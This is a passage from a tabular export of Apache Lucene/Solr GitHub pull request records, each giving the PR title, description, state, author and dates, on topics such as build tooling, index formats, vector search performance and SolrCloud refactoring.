`/opt/solr-build/solr-${VERSION}`. This image requires no other content at the end. 2. The `runtime` dockerfile, which is given the `package` image name as an input and generates everything currently setup in the Solr docker image, copying the package contents from the `package` image.  The `runtime` docker image is the one that will be pushed to Dockerhub eventually, and is run by users.  The idea is that there is also a task to generate the release docker image (which can be found under `/solr/docker/package/Dockerfile.release-package`) that is then passed to the runtime docker image. But this is a future goal and not necessary in order to merge this PR IMO.  I basically learned gradle to write this, so please give any advice on how I could make the build process better. I'm sure it is not optimal.  ### Testing  Once you run `gradle assemble`, you can test the new docker image in two ways:  - `gradle :solr:docker:test`, which will run the docker-solr integration tests using the newly assembled solr image. This will eventually fail when it reaches the test that needs root permissions however, since gradle doesn't have root permissions itself. This is a TODO. - `docker run -d -p 8983:8983 -e SOLR_JETTY_HOST=""0.0.0.0"" apache/solr:9.0.0-SNAPSHOT`, then visit the admin screen at http://localhost:8983 .   TODO: - [ ] Add ability to build with ""release"" package - [ ] Remove ability to push the `package` image. - [ ] Integrate `gradle :solr:docker:tests` into the overall `gradle tests` - [x] Make all of the tests work with gradle.","closed","","HoustonPutman","2020-08-20T21:54:32Z","2020-11-21T17:43:25Z"
"","1720","SOLR-14712 Standardize remote calls in Solr (only API)","WIP , for discussion [SOLR-14712](https://issues.apache.org/jira/browse/SOLR-14712)","open","clean-api,","noblepaul","2020-08-06T07:48:34Z","2020-08-11T09:46:52Z"
"","1813","SOLR-14613: No new APIs. use the existing APIs","WIP , do not commit. Untested  We are spending too much time to create and manage a new set of APIs instead of solving the real problem at hand  What does this PR do  - No new interfaces. Uses the existing interface - Supports configuring `assign-strategy` in `clusterprops.json` .  - Supports packages","closed","autoscaling,","noblepaul","2020-09-01T01:20:04Z","2020-09-09T23:56:39Z"
"","2318","SOLR-15138:  PerReplicaStates does not scale to large collections as well as state.json","WIP","closed","","noblepaul","2021-02-08T00:51:11Z","2021-07-22T04:38:34Z"
"","2177","SOLR-15052: Per-replica states for reducing overseer bottlenecks (trunk)","WIP","closed","","noblepaul","2021-01-05T12:46:01Z","2021-07-22T04:38:41Z"
"","1922","SOLR-14899: Make caches load from packages","WIP","closed","packages,","noblepaul","2020-09-26T13:32:53Z","2020-11-02T23:57:16Z"
"","1746","Fix syntax warning in smokeTestRelease.py","while verifying the 8.6.1 release with the latest python(3.8.5), observed one SyntaxWarning. https://adamj.eu/tech/2020/01/21/why-does-python-3-8-syntaxwarning-for-is-literal/","closed","","munendrasn","2020-08-12T16:20:42Z","2020-08-13T15:46:13Z"
"","2331","LUCENE-9322:  Lucene90VectorWriter can leak open files","While trying to add a test class for Vectors based on `BaseIndexFileFormatTestCase`, a bug surface on the Lucene90VectorWriter constructor. If there is an exception during construction, it might happen that files are not properly closed and therefore it might leak.  Here is the proposal, move the current `TestVectorValues` to a `BaseVectorFormatTestCase` which extends `BaseIndexFileFormatTestCase`.  Fix the constructor so it handle closing files on error properly.","closed","","iverase","2021-02-09T08:57:06Z","2021-02-11T07:40:29Z"
"","2264","Require Thread Names in Solr","When we are creating a new thread we should give it a name. This doesn't apply to Runnable or Callable objects that we pass to an executor, since those should be getting named by the executor itself.  Also, enforce forbidden APIs on the code. I didn't apply the rule to tests because there's so many of them and I think there is less value in the constraint.  This is especially helpful when doing profiling, otherwise we end up with a bunch of Thread-# that are hard to tell apart and search on.","closed","","madrob","2021-01-28T19:32:18Z","2021-01-28T21:04:18Z"
"","2535","LUCENE-10039: Fix single-field scoring for CombinedFieldQuery","When there's only one field, CombinedFieldQuery will ignore its weight while scoring. This makes the scoring inconsistent, since the field weight is supposed to multiply its term frequency.  This PR removes the optimizations around single-field scoring to make sure the weight is always taken into account. These optimizations are not critical since it should be uncommon to use CombinedFieldQuery with only one field.  This backport also incorporates the part of LUCENE-9823 that applies to CombinedFieldQuery. We no longer rewrite single-field queries, which can also change their scoring.","closed","","jtibshirani","2021-07-28T14:26:49Z","2021-07-28T14:28:05Z"
"","1861","SOLR-10391: Add overwrite option to UPLOAD ConfigSet action","When set to `true`, Solr will overwrite an existing configset in ZooKeeper if an UPLOAD action happens on an existing configset.  A new `cleanup` parameter can also be passed to let Solr know what to do with the files that existed in the old configset, but no longer exist in the new configset (remove or keep)","closed","","tflobbe","2020-09-12T00:23:24Z","2020-09-22T17:37:06Z"
"","2365","LUCENE-9762: DoubleValuesSource.fromQuery bug","When same doc visited twice and when the query is TPI based, an exception can be thrown.  We need to ensure the internal TPI.matches() is never called repeatedly.","closed","","dsmiley","2021-02-14T06:33:19Z","2021-02-17T03:51:18Z"
"","2093","LUCENE-9606: Wrap boolean queries generated by shape fields with a Constant score query","When querying a shape field with a Geometry collection and a CONTAINS spatial relationship, the query is rewritten as a boolean query. We should wrap the resulting query with a ConstantScoreQuery.","closed","","iverase","2020-11-23T08:46:20Z","2020-11-25T07:48:17Z"
"","2269","LUCENE-9322:  Add TestLucene90FieldInfosFormat","When introducing the new Vector format, we introduced as well a new FieldInfos format. This PR add the test for this format, similar to what it was done for the previous one.  @msokolov I think we should introduce one of this test for the Vector format (test that extends `BaseIndexFileFormatTestCase`). wdyt?","closed","","iverase","2021-01-29T09:53:55Z","2021-02-10T13:13:41Z"
"","1874","LUCENE-9510: Don't compress temporary stored fields and term vectors when index sorting is enabled.","When index sorting is enabled, stored fields and term vectors can't be written on the fly like in the normal case, so they are written into temporary files that then get resorted. For these temporary files, disabling compression speeds up indexing significantly.  On a synthetic test that indexes stored fields and a doc value field populated with random values that is used for index sorting, this resulted in a 3x indexing speedup.","closed","","jpountz","2020-09-15T06:44:28Z","2020-09-16T11:05:26Z"
"","2154","LUCENE-9642: Rotate triangle points before checking triangle orientation","When encoding.a triangle we perform two actions:   1) Make sure that the orientation of the triangle is CCW 2) Place the point with minimum X in the first position so we might rotate the points in the triangle.  It might happen if the triangle is degenerated that rotating the points might change the triangle orientation. In order to avoid that this change performs the rotation of the points first and then checks for the orientation.","closed","","iverase","2020-12-17T12:35:20Z","2021-01-04T08:48:59Z"
"","2606","SOLR-15762 Error on Join Query with sync cache","When attempting to run a join query using a synchronous filtercache, throw an error early with a link to docs rather than a mysterious IllegalStateException.  Co-Authored-By: Thomas Wöckinger","closed","","madrob","2021-11-09T01:11:31Z","2021-11-09T03:06:17Z"
"","1834","Make sure to test normal scorers with asserting wrappers.","When a query is run at the top-level, the searcher uses `Weight#bulkScorer`. Many queries don't implement this explicitly and instead rely on the default implementation which delegates to `Weight#scorer`.  Previously `AssertingWeight` would always wrap the delegate's bulk scorer. So for queries that rely on `Weight#scorer`, we weren't wrapping the scorer or iterator to run checks. This change proposes that `AssertingWeight#bulkScorer` sometimes use the default implementation to make sure we also test normal scorers.  This change would have caught the bug in LUCENE-9501.","closed","","jtibshirani","2020-09-04T23:00:00Z","2020-09-16T17:01:23Z"
"","2583","LUCENE-10119: Do not set single sort with search after","We should not set single sort when the search_after is non-null; otherwise, we will incorrectly skip documents whose values are equal to the value from the search_after and docIDs are greater than the docID from the search_after.","closed","","dnhatn","2021-09-23T20:57:31Z","2021-09-24T03:33:40Z"
"","2582","LUCENE-10119: Do not set single sort with search after","We should not set single sort when the search_after is non-null; otherwise, we will incorrectly skip documents whose values are equal to the value from the search_after and docIDs are greater than the docID from the search_after.","closed","","dnhatn","2021-09-23T18:47:43Z","2021-09-23T19:49:23Z"
"","2072","LUCENE-9499: migrate package.html files into package-info.java","We should be able to migrate old-style package.html files into package-info.java, since we have no split packages in lucene (except for test-framework).","closed","","mocobeta","2020-11-10T14:31:06Z","2020-11-10T14:57:11Z"
"","1772","LUCENE-9473: Ensure merges are stopped during abort merges","We need to disable merges while we wait for running merges since IW calls timed wait on it's lock that releases the monitor for the time being which allows new merges to be registered unless we disable them.","closed","","s1monw","2020-08-21T13:56:54Z","2020-08-24T07:15:48Z"
"","2245","LUCENE-9322: Move old field infos format to backwards-codecs.","We introduced a new `Lucene90FieldInfosFormat`, so the old `Lucene60FieldInfosFormat` should live in backwards-codecs.","closed","","jtibshirani","2021-01-26T00:41:43Z","2021-02-18T02:09:10Z"
"","2439","LUCENE-9818: print slowest suites, add an option to enable/ disable the function.","Voila.","closed","","dweiss","2021-03-01T08:44:06Z","2021-03-01T15:02:18Z"
"","2266","SOLR-15120 Reduce duplicated core creation work","Use j.u.c collections instead of sync block Rework how we load implicit handlers Additional debug and trace logging for zookeeper comms","closed","","madrob","2021-01-28T23:45:38Z","2021-01-30T21:18:34Z"
"","1914","Move 9x upgrade notes out of changes.txt","Upgrade notes have been moved out of changes.txt. While working on PR #1900, I found there were few entries which were still present in changes.txt (most likely added at a later time)","closed","","munendrasn","2020-09-23T13:33:19Z","2020-09-24T16:14:34Z"
"","2372","LUCENE-9773: upgrade icu to 68.2","Upgrade from icu 62.2 to 68.2, with Unicode 13 support.  Modify GenerateUTR30DataFiles to take the release tag as a program argument. Gradle populates this automatically, removing a manual step from regeneration process.  @dweiss made a minor tweak to regeneration: previously one of the java tools had a version number in java constant, I changed it to take this tag name as parameter, set by gradle instead.","closed","","rmuir","2021-02-15T15:39:14Z","2021-02-15T19:56:13Z"
"","2447","SOLR-15212: Update Ref Guide URLs for new Solr TLP","Updates most URLs in the Ref Guide header and text to `solr.apache.org`.   There are a few cases of the old URL left in the text, but they are part of code snippets that reflect what's in config files shipped with Solr. I thought those should stay as is until a general code sweep happens to update the old URLs.","closed","","ctargett","2021-03-03T18:12:22Z","2021-03-17T18:18:32Z"
"","2174","Remove unused test file","Trivial change, just the removal of a test file that's unused in master","closed","","tflobbe","2020-12-31T06:10:32Z","2021-01-09T00:40:26Z"
"","1789","LUCENE-9484: Allow sorting an index after the fact","Today we need to decide on an index sorting before we create the index. In some situations it might make a lot of sense to sort an index afterwards when the index doesn't change anymore or to compress older indices. This commit adds the ability to wrap readers from an unsorted index and merge it into a sorted index by using IW#addIndices.","closed","","s1monw","2020-08-26T11:37:30Z","2020-09-03T10:55:14Z"
"","1764","Ensure we only rollback IW once","Today we might rollback IW more than once if we hit an exception during the rollback code when we shutdown. This change moves the rollback code outside of the try block to ensure we always roll back but never roll back twice.","closed","","s1monw","2020-08-19T18:35:16Z","2020-08-20T21:33:35Z"
"","2212","LUCENE-9669: Add an expert API to allow opening indices created < N-1","Today we force indices that were created with N-2 and older versions of lucene to fail on open. This check doesn't even check if the codecs are available. In order to allow users to open older indices and for us to support N-2 versions this change adds an API on DirectoryReader to specify a mininum index version on a per reader basis. This doesn't apply for the IndexWriter which will fail on opening older indices.","closed","","s1monw","2021-01-16T17:38:08Z","2021-01-19T08:24:03Z"
"","2204","LUCENE-9669: Add an expert API to allow opening indices created < N-1","Today we force indices that were created with N-2 and older versions of lucene to fail on open. This check doesn't even check if the codecs are available. In order to allow users to open older indices and for us to support N-2 versions this change adds an API on DirectoryReader to specify a mininum index version on a per reader basis. This doesn't apply for the IndexWriter which will fail on opening older indices.","closed","","s1monw","2021-01-14T16:05:30Z","2021-01-14T16:09:31Z"
"","1773","SOLR-14773 Add LukeRequestHandler to the Solr Ref Guide","To replace the old https://cwiki.apache.org/confluence/display/solr/LukeRequestHandler page, and eventually provide a link to the Luke application's getting started page!","closed","","epugh","2020-08-21T21:23:30Z","2020-10-20T01:51:03Z"
"","2240","LUCENE-9575 Provide a producer for PatternTypingRule in TestRandomChains","to fix failure on seed 65EA739C95F40313","closed","","gus-asf","2021-01-25T08:57:08Z","2021-01-26T14:30:58Z"
"","2057","SOLR-14980: Added explanations on how facet methods are picked","To explain why, for example, `dvhash` doesn't work on multi-valued string fields.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","radu-gheorghe","2020-11-03T07:46:23Z","2020-11-03T07:46:23Z"
"","2520","SOLR-15355 - Upgrade hadoop to version 3.2.2 to fix CVE","To do that, I’ve needed to update 2 other files:  1) The HttpServer2.java. It has been forked from hadoop and would not be compatible anymore with this new version. I’ve only patched what was necessary to make the code compile and the test pass  2) TestSolrCloudWithSecureImpersonation.java. This test is checking the exception thrown for some keyword. However, with the new version of hadoop, a different exception is thrown, ""invalid IPv6 address"". As it seems that the important check in this test is that an exception is raised, I thought that removing this rigid assertion would keep the spirit of the test.","closed","","antogruz","2021-06-29T15:45:06Z","2021-07-02T18:26:07Z"
"","1676","SOLR-13973: Depricate Tika support in 8.7","Tika support in Solr is deprecated and is scheduled to be removed in 9.0.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Depricating Tika support in solr verion 8.7  # Solution  Reference guide has been updated and classes have been marked as depricated for tika  # Tests  All tests have been run to confirm to functionality is broken # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","kshitij91","2020-07-16T14:07:37Z","2021-10-26T20:07:42Z"
"","1788","Run tests last to fail fast on missing license and doc issues","This would have saved me many hours of waiting for tests to finish in order to realize that my java-version is not working with jlint as well as an existing RAT issue on the release branch. I think there is no harm in running tests last.","closed","","s1monw","2020-08-26T10:45:17Z","2020-08-26T10:55:29Z"
"","1776","LUCENE-9470: make TestXYMultiPolygonShapeQueries more resilient for CONTAINS queries","This test sporadically fail due to numerical errors in the GeoUtils.orient method. This PR changes the way we check for CONTAINS relationship to prevent those errors.  @nknize can you take a look?","closed","","iverase","2020-08-24T08:27:31Z","2020-09-09T14:06:26Z"
"","2000","LUCENE-9318: Clean up package name conflicts for backward-codecs","This resolves split packages between core and backward-codecs.  - `o.a.l.codecs` in backward-codecs is renamed to `o.a.l.backward_codecs`. - `o.a.l.index` in backward-codecs (only exists in src/test) is renamed to `o.a.l.backward_index`. - packages in lucene-core are unchanged.  Passes test and precommit.","closed","","mocobeta","2020-10-17T15:15:11Z","2020-10-19T14:13:55Z"
"","2157","LUCENE-9644: diversity heuristic for HNSW graph neighbor selection","This replaces the simple nearest neighbor selection with a criterion that takes into account the distance of the neighbors from each other. It is seen to provide dramatically improved recall on at least two datasets, and is what is being used by our reference implementation, hnswlib. Also:   * Split Neighbors into NeighborArray and NeighborQueue; use queue for gathering results; store graph arcs in arrays since diversity selection does not use a queue   * Add InfoStream progress messages to HnswGraphBuilder   * Add options to KnnGraphTester to support testing using ann-benchmarks (no warmup, write output to file)   * Improve memory usage; eliminate more object allocations; replaced iterator objects with single-use iterator ""views""","closed","","msokolov","2020-12-18T12:56:40Z","2020-12-22T14:49:50Z"
"","1951","SOLR-14691: Reduce object creation by using MapWriter / IteratorWriter.","This replaces nearly all Map / List usage in `MetricUtils` with `MapWriter` / `IteratorWriter`. The PR includes also changes to `Utils.MapWriterJSONWriter` to similarly avoid creating Map / List instances and instead serialize `MapWriter` / `IteratorWriter` directly.","closed","","sigram","2020-10-06T08:29:44Z","2020-10-08T11:00:14Z"
"","1867","LUCENE-9516: Remove DocConsumer and IndexingChain from Lucene","This removes the ability to replace the IndexingChain / DocConsumer in Lucenes IndexWriter. The interface is not sufficient to efficiently replace the functionality with reasonable efforts. It also seems it's completely unused at this point and hasn't been maintained in years.","closed","","s1monw","2020-09-14T08:04:30Z","2020-09-15T08:15:28Z"
"","2064","LUCENE-9600: Clean up package name conflicts between misc and core modules","This refactors misc module to resolve package name conflicts between misc and lucene-core.  - moves `o.a.l.document`, `o.a.l.index`, `o.a.l.search`, `o.a.l.store`, `o.a.l.util`, and their sub-packages under `o.a.l.misc`. - made some refactorings to remove unnecessary accesses to package-private methods in `lucene-core`. - made methods in o.a.l.index.DocHelper and o.a.l.util.FSTTester in test-framework publicly accessible for unit testing. - lucene-core isn't touched.","closed","","mocobeta","2020-11-05T08:50:14Z","2020-11-10T13:24:50Z"
"","2390","SOLR-15157: refactor Collection API to separate from Overseer and message handling abstractions","This refactoring is inserting a layer of abstraction (`CollectionCommandContext`) between Collection API commands and the `OverseerCollectionMessageHandler`, to enable future changes where Collection API messages are executed outside of Overseer.  There are (almost) no other changes in this PR. Two exceptions: 1. in `CreateCollectionCmd`, appropriate conditions were added around recently added calls related to Per Replica States collections and 2. a minor fix in test `OverseerStatusTest` regarding distributed updates and Overseer stats.  I'd rather this PR not linger around for too long if possible. Given `OverseerCollectionMessageHandler` has lost most of its contents, merging in new changes is a highly manual process.  This refactoring is intended to eventually enable constructions such as shown in the PoC (based on a slightly older snapshot of master). See line [348 in CollectionsHandler](https://github.com/murblanc/lucene-solr/commit/10cdad0e2618ea82b2b97f4a78cc0f3ff8df8082#diff-582348d44491dcb0ce1dfb169fb544e9e95620b2d0448eb1a1744f4e8dd5a349R348) there, when a request is received to create a collection, rather than enqueue a ZK message to the Collection API queue for Overseer, the execution is done locally in method [distributedCollectionCreation](https://github.com/murblanc/lucene-solr/commit/10cdad0e2618ea82b2b97f4a78cc0f3ff8df8082#diff-582348d44491dcb0ce1dfb169fb544e9e95620b2d0448eb1a1744f4e8dd5a349R280). This method needs to call the Collection API command, and does not execute in the context of the Overseer. The motivation for doing the refactoring separately (as discussed in [Slack](https://the-asf.slack.com/archives/CEKUCUNE9/p1612908679186300)) is to keep the hardest to review part (code moving around) clean of any other changes (and a side benefit is that the actual Collection API distribution will take quite some time, and having part of it be such a refactoring waiting for a few weeks on a branch is a recipe for not being able to merge it safely).","closed","","murblanc","2021-02-17T15:10:58Z","2021-02-19T13:41:03Z"
"","1708","LUCENE-9445 Add support for case insensitive regex searches in QueryParser","This PR uses the standard /.../i regex syntax to denote case insensitive queries, exposing the underlying case insensitive regex support added in LUCENE-9386   This could be considered a breaking change if users had a regex immediately followed by the letter `i` but I imagine a case insensitive search would have been the intention of the searcher all along.  Jira issue: https://issues.apache.org/jira/browse/LUCENE-9445","open","enhancement,","markharwood","2020-07-31T14:05:48Z","2020-08-25T09:41:02Z"
"","2503","Re-introduce ant precommit github action in 8x branch","This PR re-introduces the `ant precommit` github action for branch_8x, which was removed when ""wiping"" master branch after the split.","closed","","janhoy","2021-06-02T08:02:37Z","2021-06-02T13:57:32Z"
"","1842","LUCENE-9512: Move LockFactory stress test to be a unit/integration test","This PR moves the lock factory stress test to be a :lucene:core unit/integration test. In verbose mode the output of clients is inherited, in standard test mode its written to files (to allow debugging).  Unfortunately, as the server uses TCP/IP socket to communicate with the childs, I have to add listen/accept to ephemeral ports to lucene's policy file (@rmuir looks ok?).  If this gets backported to 8.x, we can get rid of the rather complicated Ant Target, too.  See https://issues.apache.org/jira/browse/LUCENE-9512 for background information.","closed","enhancement,","uschindler","2020-09-08T17:23:53Z","2020-09-09T17:11:49Z"
"","1967","LUCENE-9577: Move Lucene/Solr Documentation assembly to subproject","This PR moves the changes.txt formatting, site Javadocs, markdown formatting to subprojects (`:lucene:documentation`, `:solr:documentation`.  This is still WIP, not everything works.","closed","","uschindler","2020-10-08T23:38:08Z","2020-10-09T12:56:49Z"
"","1974","SOLR-14914: Add option to disable metrics collection","This PR is owned and operated by @sigram :wink:","closed","","noblepaul","2020-10-12T10:45:57Z","2020-11-10T22:45:07Z"
"","2234","SOLR-15094: Replace all code references of coreNodeName to replicaName","This PR is just focusing on code level changes.   The actual external facing variables can be addressed separately","open","cleanup,","noblepaul","2021-01-22T02:57:40Z","2021-01-29T17:18:44Z"
"","1796","LUCENE-9475: Enhance the Gradle build as necessary after removing Ant…","This PR is just a starting point. I grepped through the source code to try to find all the references to ""ant"". Do you have any idea how many words in our code have ""ant"" in them? Like constant, spanTerm, .... ;) Over 7,000 if you're curious.  Anyway, I pared all those down and there are  a few files (23 or so) that reference ant legitimately. I fixed some that were simple, things like how to run a particular test, but for a number of them I just added //nocommit so we can find them easily. Here are some examples of things I punted on and just added //nocommits for:  - The lucene/benchmarks. - UnicodeProps.java references an ""ant unicode-data"" target. - TokebnInfoDictionaryTest has a reference to an ""ant test-tools"" target etc.  I'll check against the 8x version for the targets I didn't immediately see a corresponding Gradle task for, and if the are missing on ant I'll feel safe to remove them. Also I haven't poked around (yet) in the gradle build for tasks that weren't named the same but did the same thing.  I'll start working on some of the nocommits, any hints welcome.","closed","","ErickErickson","2020-08-28T16:32:32Z","2020-10-25T15:54:49Z"
"","2004","SOLR-14942: Reduce leader election time on node shutdown","This PR is based on the work of @CaoManhDat   # Description  The shutdown process waits for all replicas/cores to be closed before removing the election node of the leader. This can take some time due to index flush or merge activities on the leader cores and delays new leaders from being elected. This leads to long gap of time during which indexing requests fail.  # Solution  This PR introduces a Phaser that registers and deregisters all update requests. The shutdown process pauses indexing requests, waits for all in-flight indexing requests to complete, removes election nodes (thus triggering leader election) and then closes all replicas.  # Tests  Since this PR makes changes to Solr's shutdown process, it is difficult to write a unit/integration tests inside Solr itself. This was tested by creating a test harness outside of Solr. The steps were: - Create a Collection with 1 shard, 3 replicas - Do heavy indexing when all replicas are ACTIVE - Shut down the leader node - Measure the leaderless time (time during which there is no live/active leader)   Before the patch | After the patch -- | -- Shutting down time: 100ms Leader election: 46s | Shutting down time: 12s Leader election: 3s Shutting down time: 37s Leader election: 3s | Shutting down time: 31s Leader election: 3s Shutting down time: 200ms Leader election: 17s | Shutting down time: 100ms Leader election: 3s Shutting down time: 200ms Leader election: 27s | Shutting down time: 4s Leader election: 3s  Since the patch introduces waiting for all updates to finish before giving up the leadership so the shut down time gets increased on average, but also it makes leader election more stable and improves consistency.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","shalinmangar","2020-10-19T11:07:45Z","2020-10-24T12:09:15Z"
"","2421","SOLR-15130 take 2: Allow per-collection replica placement node sets","This PR is based on master, it uses exclusively the plugin configuration properties to configure the placements (there are no traces of the config in collection properties).","closed","","sigram","2021-02-23T14:04:23Z","2021-02-25T09:52:22Z"
"","1837","LUCENE-7882: First idea of using Java 15 hidden anonymous classes for Lucene expressions","This PR is a first (but already working) idea of using Java 15 hidden classes (see https://openjdk.java.net/jeps/371) to implement the Lucene expressions. The big advantages: - No classloader for every expression is needed, because the class is completely anonymous and has no strong reference to a classloader. Actually the class has a classloader to lookup any referenced other class, but it is NOT loaded by any classloader - The class can easily be unloaded - The performance of loading that class is better, as no locks can occur (classloaders have locks when looking up classes), see https://issues.apache.org/jira/browse/LUCENE-7882  Backside: - The class and its methods do not appear in any stack trace. This also fails one test in the test suite. When using this for Lucene expressions, we have to think about a better way how to make the source code and method calls visible in stack traces. Like lambda frames the hidden class is not visible (unless enabled in JVM to show hidden frames). I have a question open on openjdk mailing list: https://mail.openjdk.java.net/pipermail/core-libs-dev/2020-September/068542.html - It currently does not work if you pass a different classloader than Lucene's to the expressions module. To allow this we need to change APIs a bit (Classloader -> Lookup).  @mikemccand can you test this with JDK 15 (release candidate) and your test. You should not see any locks anymore, speed should be higher, and the created anonymous classes should be unloaded very fast.","open","optimization,","uschindler","2020-09-06T21:47:02Z","2020-09-08T18:53:07Z"
"","1892","Improve TestConfigSetsAPI","This PR includes some improvements to TestConfigSetsAPI: * Extend `SolrCloudTestCase`: This is mainly because before, the test was creating clusters for every unit test vs. a single one for the suite * Use Mock authentication: This test is not to test the authentication framework, The `ConfigSetHandler` only needs to know if an auth plugin was configured and if credentials were provided, so the Mock components do just that. This makes the tests easier and faster *Cleanup a bunch of exceptions from the logs * Enabled back `testUploadWithLibDirective`","closed","","tflobbe","2020-09-19T00:58:04Z","2020-09-21T17:03:52Z"
"","2173","float performance tester, for demo only","This PR has a standalone test program that demonstrates some interesting performance characteristics of different data access patterns. It's not intended to be merged; I'm just putting it up here for visibility and discussion.  I have been working on improving the performance of vector KNN search, and in particular working on closing the gap with the nmslib/hnswlib reference implementation. hnswlib is coded in C++, but I believe a pure Java implementation should be able to provide pretty close performance. My goal has been to get within 2x, but we're still pretty far off from that, maybe 8x difference. Looking at the profiler, we seem to spend all our time in dot product computation, which is expected. So I wrote a simple benchmark to look more closely at this aspect and stumbled on something that really surprised me, demonstrated by this program.  The speed of the bulk dot product computation we do (a thousand or so per query, for an index of 1M vectors) is heavily influenced by memory access patterns. I'm guessing it has something to do with ability to use the CPU's memory caches, avoiding the need to go out to main memory.  In this micro-benchmark I compared a few different memory access patterns, computing 1M dot products across pairs of vectors taken from the same set. The fastest is to load all floats into a single contiguous on-heap array, and access that via pointers (which is like what `hnswlib` does). I compared that with various other models, including something simulating what we do today in `Lucene`, memory mapping a file, reading it as bytes, and converting that into a float array for each access. If we access the vector data sequentially, there is a 4x difference in speed, but even for random access there is nearly a 2x difference.  The MANY ARRAYS case pre-loads all vectors on heap, but stores them in separate arrays per vector, rather than in a single contiguous array. The SKIP ONE COPY case is like the BASELINE, but simulates what we might see if we implemented `IndexInput.readFloats`, so we could avoid one array copy that's needed today.  ## random access  pattern                  time/iteration BASELINE             0.594572 us SKIP ONE COPY  0.401249 us MANY ARRAYS    0.393746 us ONE BIG ARRAY  0.330135 us  ## sequential access  pattern                        time/iteration BASELINE                  0.443061 us MANY ARRAYS          0.188859 us SKIP ONE COPY        0.154549 us ONE BIG ARRAY        0.109249 us","open","","msokolov","2020-12-30T13:54:42Z","2020-12-30T20:43:23Z"
"","1806","LUCENE-9475: Switch validateSourcePatterns away from Ant legacy","This PR changes the legacy setp of the checkSourcePatterns task to directly execute the checker code in the running Gradle VM.  Because of Ant compatibility we preserved the old code using Ant's Groovy task. So it was executing Groovy shell inside Groovy. The code changes are minimal, further improvements are coming later.  This task has no outputs, so it's declared to run always. We may improve this, if we make the checked files and patterns a task input. Quick tests on different branches showed that task works.  This PR fixes the stupid warning caused by the groovy-inside-groovy:  ``` > Task :validateSourcePatterns Trying to override old definition of task fileScanner ```","closed","","uschindler","2020-08-30T23:40:17Z","2020-08-31T10:52:10Z"
"","1719","SOLR-14702: Remove Master and Slave from Code Base and Docs (8.x)","This PR brings the changes from https://github.com/apache/lucene-solr/pull/1711 into 8.x and add a commit to bring back compatibility. With this code change, a Solr instance running 8.7 should be able to replicate from a Solr instance running 8.x < 8.7, and a Solr instance running 9.0 should be able to replicate from an instance running 8.7 Some manual testing to check before merging this is listed here: https://issues.apache.org/jira/browse/SOLR-14708 I haven't validated the UI yet.  I kept the ""bring back compatibility"" changes in a single commit to make it easier to review the changes.  CC @MarcusSorealheis","closed","","tflobbe","2020-08-06T00:24:37Z","2020-08-07T23:10:58Z"
"","2521","Backport LUCENE-9948 LUCENE-9964","This PR backports LUCENE-9948 (Automatically detect multi and single valued..) and LUCENE-9964 (Duplicate long values ...).  Backporting just LUCENE-9964 was difficult to achieve without backporting the changes made by LUCENE-9948 in `LongValueFacetCounts` (and would've messed up the code!).  Note to reviewers: I had to make an extra change f10ca3a (apart from the backport commits) to get `ant test` running. Apart from that all changes are pretty much `cherry-pick`ed from upstream.     There was some concern about maintaining backwards compatibility in the LUCENE-9948 JIRA (as it removes a param). Is it fine if we change the API in the new Lucene 8.10 version?","closed","","gautamworah96","2021-07-02T22:33:28Z","2021-08-02T06:26:05Z"
"","2471","LUCENE-9385: (Backporting) Add FacetsConfig option to control which drill-down terms are indexed for a FacetLabel","This PR backports changes from https://github.com/apache/lucene/pull/25 into Lucene 8x  I have run `ant clean; ant precommit; ant test` to validate the changes.","closed","","zacharymorn","2021-03-27T19:17:50Z","2021-03-30T03:13:46Z"
"","2637","LUCENE-10236:  Update field-weight used in CombinedFieldQuery scoring calculation (8.11.2 Backporting)","This PR backports bug fix https://github.com/apache/lucene/pull/444 to version `8.11.2`","open","","zacharymorn","2022-01-06T06:03:01Z","2022-05-31T15:49:48Z"
"","2276","Improve backwards compatibility tests for sorted indexes.","This PR also cleans up some old checks that only applied to pre-6.0 indices.","closed","","jtibshirani","2021-01-30T01:49:43Z","2021-02-03T17:27:44Z"
